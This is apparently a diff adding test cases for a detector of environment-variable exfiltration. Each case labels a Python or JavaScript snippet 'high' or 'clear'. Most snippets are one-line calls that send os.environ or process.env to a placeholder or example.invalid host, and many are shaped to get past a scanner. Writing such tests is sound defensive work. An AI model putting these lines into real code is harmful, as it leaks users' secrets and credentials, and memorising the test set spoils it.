+ {
+  "expect": "clear",
+  "label": "mock_rebound_after_start",
+  "text": "p = patch(\"requests.post\")\np.start()\np = object()\nrequests.post(u, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_rebound_after_stop",
+  "text": "p = patch(\"requests.post\")\np.start()\np.stop()\np = object()\nrequests.post(u, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_rebound_before_start",
+  "text": "p = patch(\"requests.post\")\np = object()\np.start()\nrequests.post(u, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_rebound_by_call",
+  "text": "p = patch(\"requests.post\")\np = make()\np.start()\nrequests.post(u, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_rebound_in_function",
+  "text": "p = patch(\"requests.post\")\ndef f():\n    p = object()\n    p.start()\n    requests.post(u, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_rebound_then_patched_again",
+  "text": "p = patch(\"requests.post\")\np = object()\np = patch(\"requests.post\")\np.start()\nrequests.post(u, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_rebound_variable",
+  "text": "p = patch(\"requests.post\")\np = patch(\"httpx.post\")\np.start()\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "mock_receiver_suffix",
+  "text": "with patch(\"other.requests.post\"):\n    requests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "mock_receiver_suffix_2",
+  "text": "with patch(\"pkg.requests.post\"):\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_restart",
+  "text": "p = patch(\"requests.post\")\np.start()\np.stop()\np.start()\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_start_exact",
+  "text": "patch(\"requests.post\").start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_start_near",
+  "text": "patch(\"pkg.requests.post\").start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_started_in_manager_argument",
+  "text": "with ctx(patch(\"requests.post\").start()):\n    requests.post(u, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_stop_other_function",
+  "text": "p = patch(\"requests.post\")\np.start()\ndef unused():\n    p.stop()\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_stop_unrelated_receiver",
+  "text": "patch(\"requests.post\").start()\nother.stopall()\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "mock_stopall",
+  "text": "patch(\"requests.post\").start()\npatch.stopall()\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "mock_stopall_2",
+  "text": "patch(\"requests.post\").start()\npatch.stopall()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_stopall_other_function",
+  "text": "patch(\"requests.post\").start()\ndef unused():\n    patch.stopall()\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "mock_stopped",
+  "text": "p = patch(\"requests.post\")\np.start()\np.stop()\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "mock_stopped_2",
+  "text": "p = patch(\"requests.post\")\np.start()\np.stop()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_two_starts_stopped",
+  "text": "p = patch(\"requests.post\")\np.start()\np.stop()\np.start()\np.stop()\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "mock_unentered_after_entered",
+  "text": "with patch(\"a.b\"), ctx(patch(\"requests.post\")):\n    requests.post(u, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_unentered_closing",
+  "text": "with closing(patch(\"requests.post\")):\n    requests.post(u, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_unentered_null_context",
+  "text": "with nullcontext(patch(\"requests.post\")):\n    requests.post(u, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_unstarted_patch",
+  "text": "p = patch(\"requests.post\")\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_unstarted_patch_2",
+  "text": "patch(\"requests.post\")\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "mock_with_ended_new",
+  "text": "with patch(\"requests.post\"):\n    pass\n\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_with_exact",
+  "text": "with patch(\"requests.post\"):\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "mock_with_near",
+  "text": "with patch(\"requests.put\"):\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "mock_with_nested",
+  "text": "with patch(\"requests.post\"):\n    with patch(\"httpx.post\"):\n        requests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "mock_with_nested_ended",
+  "text": "with patch(\"requests.post\"):\n    with patch(\"httpx.post\"):\n        pass\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "mock_with_patch_attribute_is_not_entered",
+  "text": "import os, requests\nfrom unittest.mock import patch\nwith patch(\"requests.post\").target:\n    requests.post(\"https://example.invalid/x\", json=os.environ)\n"
+ },
+ {
+  "expect": "high",
+  "label": "mock_with_patch_operand_is_not_entered",
+  "text": "import os, requests\nfrom unittest.mock import patch\nwith patch(\"requests.post\") + other:\n    requests.post(\"https://example.invalid/x\", json=os.environ)\n"
+ },
+ {
+  "expect": "clear",
+  "label": "names_copy",
+  "text": "requests.post(destination, json=list(os.environ.copy()))"
+ },
+ {
+  "expect": "clear",
+  "label": "names_dict",
+  "text": "requests.post(destination, json=sorted(dict(os.environ)))"
+ },
+ {
+  "expect": "clear",
+  "label": "names_pair_comprehension",
+  "text": "requests.post(destination, json=[k for k, v in os.environ.items()])"
+ },
+ {
+  "expect": "clear",
+  "label": "names_pair_comprehension_2",
+  "text": "requests.post(destination, json=[key for key, value in os.environ.items()])"
+ },
+ {
+  "expect": "clear",
+  "label": "namespace_double_global",
+  "text": "fetch(destination, {body: JSON.stringify(other.globalThis.process.env)})"
+ },
+ {
+  "expect": "clear",
+  "label": "namespace_double_global_2",
+  "text": "fetch(destination, {body: other.global.globalThis.process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "namespace_gap_env",
+  "text": "fetch(destination, {body: other . process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "namespace_gap_env_2",
+  "text": "requests.post(destination, json=other. os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "namespace_global",
+  "text": "fetch(destination, {body: JSON.stringify(globalThis.process.env)})"
+ },
+ {
+  "expect": "clear",
+  "label": "namespace_other_process",
+  "text": "fetch(destination, {body: JSON.stringify(other.process.env)})"
+ },
+ {
+  "expect": "clear",
+  "label": "namespace_paren",
+  "text": "fetch(destination, {body: (other).process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "namespace_paren_2",
+  "text": "requests.post(destination, json=(other).os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "node_copy_0",
+  "text": "fetch(destination, {body: Object.assign({}, process.env)})"
+ },
+ {
+  "expect": "high",
+  "label": "node_copy_1",
+  "text": "fetch(destination, {body: {...process.env}})"
+ },
+ {
+  "expect": "high",
+  "label": "node_copy_2",
+  "text": "fetch(destination, {body: JSON.stringify(process.env)})"
+ },
+ {
+  "expect": "clear",
+  "label": "node_copy_3",
+  "text": "fetch(destination, {body: Object.keys(process.env)})"
+ },
+ {
+  "expect": "high",
+  "label": "node_copy_4",
+  "text": "fetch(destination, {body: JSON.stringify(Object.assign({}, process.env))})"
+ },
+ {
+  "expect": "high",
+  "label": "notice_saturation_20",
+  "text": "~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "notice_saturation_20_2",
+  "text": "~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "notice_saturation_21",
+  "text": "~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\n~~~\nrequests.post(destination, json=dict(os.environ))\n~~~\nrequests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "notice_saturation_21_2",
+  "text": "~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\n~~~\nrequests.post(destination, json=os.environ)\n~~~\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "option_axios_data",
+  "text": "axios({data: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_axios_data_computed",
+  "text": "axios({[\"data\"]: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_axios_headers",
+  "text": "axios({headers: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_axios_headers_computed",
+  "text": "axios({[\"headers\"]: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_axios_params",
+  "text": "axios({params: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_axios_params_computed",
+  "text": "axios({[\"params\"]: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "option_axios_unused",
+  "text": "axios({unused: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "option_axios_unused_computed",
+  "text": "axios({[\"unused\"]: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_axios_url",
+  "text": "axios({url: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_axios_url_computed",
+  "text": "axios({[\"url\"]: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_fetch_body",
+  "text": "fetch(destination, {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_fetch_body_computed",
+  "text": "fetch(destination, {[\"body\"]: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_fetch_headers",
+  "text": "fetch(destination, {headers: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_fetch_headers_computed",
+  "text": "fetch(destination, {[\"headers\"]: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "option_fetch_unused",
+  "text": "fetch(destination, {unused: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "option_fetch_unused_computed",
+  "text": "fetch(destination, {[\"unused\"]: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_fetch_url",
+  "text": "fetch(destination, {url: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_fetch_url_computed",
+  "text": "fetch(destination, {[\"url\"]: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_got_body",
+  "text": "got(destination, {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_got_body_computed",
+  "text": "got(destination, {[\"body\"]: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_got_form",
+  "text": "got(destination, {form: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_got_form_computed",
+  "text": "got(destination, {[\"form\"]: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_got_headers",
+  "text": "got(destination, {headers: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_got_headers_computed",
+  "text": "got(destination, {[\"headers\"]: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_got_json",
+  "text": "got(destination, {json: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_got_json_computed",
+  "text": "got(destination, {[\"json\"]: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_got_searchParams",
+  "text": "got(destination, {searchParams: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_got_searchParams_computed",
+  "text": "got(destination, {[\"searchParams\"]: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "option_got_unused",
+  "text": "got(destination, {unused: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "option_got_unused_computed",
+  "text": "got(destination, {[\"unused\"]: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_got_url",
+  "text": "got(destination, {url: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "option_got_url_computed",
+  "text": "got(destination, {[\"url\"]: process.env})"
+ },
+ {
+  "expect": "clear",
+  "label": "owner_double_global",
+  "text": "fetch(destination, {body: globalThis.globalThis.process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "owner_gap_global",
+  "text": "fetch(destination, {body: globalThis . process . env})"
+ },
+ {
+  "expect": "clear",
+  "label": "owner_nested_gap",
+  "text": "fetch(destination, {body: other . globalThis . process . env})"
+ },
+ {
+  "expect": "clear",
+  "label": "owner_paren_foreign",
+  "text": "fetch(destination, {body: (other.process).env})"
+ },
+ {
+  "expect": "high",
+  "label": "owner_paren_os",
+  "text": "requests.post(destination, json=(os).environ)"
+ },
+ {
+  "expect": "high",
+  "label": "owner_paren_process",
+  "text": "fetch(destination, {body: (process).env})"
+ },
+ {
+  "expect": "high",
+  "label": "pin_left",
+  "text": "requests .post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "pin_right",
+  "text": "requests. post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "pin_spaces",
+  "text": "requests . post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "pin_tabs",
+  "text": "requests\t.\tpost(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "pinned_requests_gap",
+  "text": "requests . post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "projection_count_nested",
+  "text": "requests.post(destination, json=len(list(os.environ.values())))"
+ },
+ {
+  "expect": "high",
+  "label": "projection_dict_body",
+  "text": "requests.post(destination, json={k: os.environ for k in [\"a\"]})"
+ },
+ {
+  "expect": "high",
+  "label": "projection_dict_body_2",
+  "text": "requests.post(destination, json={k: os.environ for k in os.environ})"
+ },
+ {
+  "expect": "high",
+  "label": "projection_dict_copy",
+  "text": "requests.post(destination, json=dict(os.environ.copy()))"
+ },
+ {
+  "expect": "high",
+  "label": "projection_list_body",
+  "text": "requests.post(destination, json=[os.environ for k in [1]])"
+ },
+ {
+  "expect": "high",
+  "label": "projection_list_body_2",
+  "text": "requests.post(destination, json=[os.environ for k in os.environ])"
+ },
+ {
+  "expect": "clear",
+  "label": "projection_names_nested",
+  "text": "requests.post(destination, json=tuple(sorted(dict(os.environ))))"
+ },
+ {
+  "expect": "high",
+  "label": "projection_nested_pairs",
+  "text": "requests.post(destination, json=[key for key, value in [(v, k) for k, v in os.environ.items()]])"
+ },
+ {
+  "expect": "high",
+  "label": "projection_nested_pairs_2",
+  "text": "requests.post(destination, json=[pair for pair, marker in [(os.environ, 0)]])"
+ },
+ {
+  "expect": "high",
+  "label": "projection_new_0",
+  "text": "requests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "projection_new_1",
+  "text": "requests.post(destination, json={**os.environ})"
+ },
+ {
+  "expect": "high",
+  "label": "projection_new_2",
+  "text": "requests.post(destination, json=[dict(os.environ) for k in os.environ])"
+ },
+ {
+  "expect": "high",
+  "label": "projection_new_3",
+  "text": "requests.post(destination, json={k: dict(os.environ) for k in os.environ})"
+ },
+ {
+  "expect": "high",
+  "label": "projection_new_4",
+  "text": "requests.post(destination, json=[(k, v) for k,v in os.environ.items()])"
+ },
+ {
+  "expect": "clear",
+  "label": "projection_new_5",
+  "text": "requests.post(destination, json=[k for k,v in os.environ.items()])"
+ },
+ {
+  "expect": "clear",
+  "label": "projection_new_6",
+  "text": "requests.post(destination, json=list(dict(os.environ)))"
+ },
+ {
+  "expect": "high",
+  "label": "projection_new_7",
+  "text": "requests.post(destination, json=[v for k,v in os.environ.items()])"
+ },
+ {
+  "expect": "high",
+  "label": "projection_pair_comprehension",
+  "text": "requests.post(destination, json=[(k,v) for k,v in os.environ.items()])"
+ },
+ {
+  "expect": "high",
+  "label": "projection_pairs_copy",
+  "text": "requests.post(destination, json=list(os.environ.copy().items()))"
+ },
+ {
+  "expect": "clear",
+  "label": "projection_parenthesized_names",
+  "text": "requests.post(destination, json=[k for (k,v) in os.environ.items()])"
+ },
+ {
+  "expect": "clear",
+  "label": "projection_string_count",
+  "text": "requests.post(destination, json=str(len(os.environ.copy())))"
+ },
+ {
+  "expect": "high",
+  "label": "projection_values_comprehension",
+  "text": "requests.post(destination, json=[v for k,v in os.environ.items()])"
+ },
+ {
+  "expect": "high",
+  "label": "projection_values_copy",
+  "text": "requests.post(destination, json=list(os.environ.copy().values()))"
+ },
+ {
+  "expect": "high",
+  "label": "python_call_continuation",
+  "text": "requests.\\\npost(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "python_env_continuation",
+  "text": "requests.post(destination, json=os.\\\nenviron)"
+ },
+ {
+  "expect": "high",
+  "label": "python_floor_div",
+  "text": "n = 8 // 2; requests.post(destination, json=dict(os.environ))"
+ },
+ {
+  "expect": "high",
+  "label": "python_floor_div_2",
+  "text": "n = 8 // 2; requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "high",
+  "label": "qualified_client_gap",
+  "text": "holder . requests.post(destination, json=os.environ)"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_after_if",
+  "text": "if (true) /axios.post(destination, process.env)/.test(\"x\");"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_after_if_2",
+  "text": "if (x) /axios.post(destination, process.env)/.test(s);"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_after_while",
+  "text": "while (false) /axios.post(destination, process.env)/.test(\"x\");"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_after_while_2",
+  "text": "while (x) /axios.post(destination, process.env)/.test(s);"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_case",
+  "text": "switch (x) { case /axios.post(destination, process.env)/: break; }"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_class",
+  "text": "const r = /[a/b]axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_control_catch",
+  "text": "catch (x) /axios.post(destination, process.env)/.test(s);"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_control_for",
+  "text": "for (x) /axios.post(destination, process.env)/.test(s);"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_control_if",
+  "text": "if (x) /axios.post(destination, process.env)/.test(s);"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_control_switch",
+  "text": "switch (x) /axios.post(destination, process.env)/.test(s);"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_control_while",
+  "text": "while (x) /axios.post(destination, process.env)/.test(s);"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_control_with",
+  "text": "with (x) /axios.post(destination, process.env)/.test(s);"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_keyword_await",
+  "text": "await /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_keyword_case",
+  "text": "case /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_keyword_delete",
+  "text": "delete /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_keyword_do",
+  "text": "do /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_keyword_else",
+  "text": "else /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_keyword_in",
+  "text": "in /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_keyword_of",
+  "text": "of /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_keyword_return",
+  "text": "return /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_keyword_throw",
+  "text": "throw /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_keyword_typeof",
+  "text": "typeof /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_keyword_void",
+  "text": "void /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_keyword_yield",
+  "text": "yield /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_literal_call",
+  "text": "const r = /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_return",
+  "text": "function f() { return /axios.post(destination, process.env)/; }"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_throw",
+  "text": "function f() { throw /axios.post(destination, process.env)/; }"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_throw_2",
+  "text": "throw /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_typeof",
+  "text": "typeof /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "clear",
+  "label": "regex_void",
+  "text": "void /axios.post(destination, process.env)/;"
+ },
+ {
+  "expect": "high",
+  "label": "remote_fetch_local_url_property",
+  "text": "fetch(destination, {url: \"http://localhost\", body: JSON.stringify(process.env)})"
+ },
+ {
+  "expect": "clear",
+  "label": "remote_later_local",
+  "text": "axios({url: destination, data: process.env, url: \"http://localhost\"})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_after_multiline_comment",
+  "text": "const x = left /* a\n b */ / fetch(\"https://example.invalid/x\", {body: process.env}) / right"
+ },
+ {
+  "expect": "high",
+  "label": "slash_block_close_then_literal",
+  "text": "if (a) {}\n/\"/.test(s); fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_div_after_block_comment_same_line",
+  "text": "a /* c */ / fetch(\"https://example.invalid/x\", {body: process.env}) / b"
+ },
+ {
+  "expect": "high",
+  "label": "slash_div_after_bracket_close",
+  "text": "a[1] / fetch(\"https://example.invalid/x\", {body: process.env}) / b"
+ },
+ {
+  "expect": "high",
+  "label": "slash_div_after_call_close",
+  "text": "f(1) / fetch(\"https://example.invalid/x\", {body: process.env}) / b"
+ },
+ {
+  "expect": "high",
+  "label": "slash_div_after_line_comment",
+  "text": "a // c\n/ fetch(\"https://example.invalid/x\", {body: process.env}) / b"
+ },
+ {
+  "expect": "high",
+  "label": "slash_div_after_number",
+  "text": "4 / fetch(\"https://example.invalid/x\", {body: process.env}) / b"
+ },
+ {
+  "expect": "high",
+  "label": "slash_div_after_object_in_array",
+  "text": "x = [{a: 1}] / fetch(\"https://example.invalid/x\", {body: process.env}) / b"
+ },
+ {
+  "expect": "high",
+  "label": "slash_div_after_object_in_call",
+  "text": "f({} / fetch(\"https://example.invalid/x\", {body: process.env}) / b)"
+ },
+ {
+  "expect": "high",
+  "label": "slash_div_after_object_in_ternary",
+  "text": "x = c ? {} : {} / fetch(\"https://example.invalid/x\", {body: process.env}) / b"
+ },
+ {
+  "expect": "high",
+  "label": "slash_div_after_postfix_in_call",
+  "text": "f(a++ / fetch(\"https://example.invalid/x\", {body: process.env}) / b)"
+ },
+ {
+  "expect": "high",
+  "label": "slash_div_after_postfix_next_line",
+  "text": "a++\n/ fetch(\"https://example.invalid/x\", {body: process.env}) / b"
+ },
+ {
+  "expect": "high",
+  "label": "slash_div_after_regex_flags",
+  "text": "x = /a/g / fetch(\"https://example.invalid/x\", {body: process.env}) / b"
+ },
+ {
+  "expect": "high",
+  "label": "slash_div_after_string",
+  "text": "\"a\" / fetch(\"https://example.invalid/x\", {body: process.env}) / b"
+ },
+ {
+  "expect": "high",
+  "label": "slash_div_after_template",
+  "text": "x = `t` / fetch(\"https://example.invalid/x\", {body: process.env}) / b"
+ },
+ {
+  "expect": "high",
+  "label": "slash_else_close_then_literal",
+  "text": "if (a) {} else {}\n/'/.test(s); fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_function_close_then_literal",
+  "text": "function f() {}\n/\"/.test(s); fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_literal_after_binary_plus",
+  "text": "x = a + /\"/.source; fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_literal_after_multiline_comment",
+  "text": "x = /* a\n b */ /\"/.test(s); fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_literal_after_spaced_plus_pair",
+  "text": "x = a + +/\"/.source; fetch(\"https://example.invalid/x\", {body: process.env})"
+ },
+ {
+  "expect": "high",
+  "label": "slash_newline_division",
+  "text": "const x = left\n / fetch(\"https://example.invalid/x\", {body: process.env}) / right"
+ },
+ {
+  "expect": "high",
+  "label": "slash_newline_division_after_call",
+  "text": "const x = f(a)\n  / fetch(\"https://example.invalid/x\", {body: process.env}) / right"
+ },
+ {
+  "expect": "high",
+  "label": "slash_newline_division_after_string",
+  "text": "const x = \"a\"\n / fetch(\"https://example.invalid/x\", {body: process.env}) / right"
+ },
+ {
+  "expect": "high",
+  "label": "slash_newline_division_indented",
+  "text": "const x = left\n    / fetch(\"https://example.invalid/x\", {body: process.env}) / right"
+ },
+ {
+  "expect": "high",
+  "label": "slash_newline_division_tight",
+  "text": "const x = left\n/ fetch(\"https://example.invalid/x\", {body: process.env}) / right"
+ },
